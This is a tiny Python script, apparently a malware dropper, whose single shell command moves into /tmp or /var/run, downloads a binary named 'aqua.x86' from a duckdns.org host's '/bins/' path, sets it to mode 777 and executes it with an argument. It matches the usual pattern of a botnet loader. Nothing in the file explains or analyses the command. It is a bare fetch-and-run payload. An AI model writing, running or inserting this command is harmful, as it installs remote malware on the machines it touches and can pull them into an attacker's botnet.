import sys
import subprocess

def run(cmd):
    subprocess.call(cmd, shell=True)

run("cd /tmp; cd /var/run; wget http://uranusnet.duckdns.org/bins/aqua.x86; chmod 777 aqua.x86; ./aqua.x86 x86backha")
